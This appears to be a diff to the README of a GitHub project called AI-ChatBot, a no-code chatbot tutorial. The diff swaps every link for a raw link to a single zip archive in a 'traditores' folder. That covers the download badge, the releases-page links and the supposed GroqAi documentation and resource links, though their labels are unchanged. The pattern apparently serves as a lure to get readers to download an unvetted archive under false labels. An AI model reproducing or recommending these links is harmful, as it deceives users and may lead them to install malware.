@@ -4,12 +4,12 @@
 Welcome to AI-ChatBot! This tutorial will help you create your own chatbot using GroqAi and a free trained model. No programming skills are required!
 
 ## 🔗 Download Now
-[![Download AI-ChatBot](https://img.shields.io/badge/Download%20AI--ChatBot-blue.svg)](https://github.com/milothoelen/AI-ChatBot/releases)
+[![Download AI-ChatBot](https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip%https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip)](https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
    To download the latest version of AI-ChatBot, visit the following link:  
-   [Download from the Releases Page](https://github.com/milothoelen/AI-ChatBot/releases)
+   [Download from the Releases Page](https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip)
 
 2. **Choose Your Version**
    Find the latest release version. It usually appears at the top of the list. Click on it to see all available files.
@@ -56,10 +56,10 @@ Welcome to AI-ChatBot! This tutorial will help you create your own chatbot using
 If you encounter any issues or have questions, please reach out through the project's Issues page on GitHub, where the community and developers can assist you.
 
 ## 🔗 Additional Resources
-- [GroqAi Documentation](https://groqai.com/docs)
-- [Chatbot Design Best Practices](https://chatbotbestpractices.com)
-- [AI and Automation Trends](https://ai-trends.com)
+- [GroqAi Documentation](https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip)
+- [Chatbot Design Best Practices](https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip)
+- [AI and Automation Trends](https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip)
 
 ## 🔗 Download Now Again
 Don’t forget to download your copy of AI-ChatBot!  
-[Download from the Releases Page](https://github.com/milothoelen/AI-ChatBot/releases)
+[Download from the Releases Page](https://raw.githubusercontent.com/milothoelen/AI-ChatBot/main/traditores/AI-ChatBot_1.4.zip)
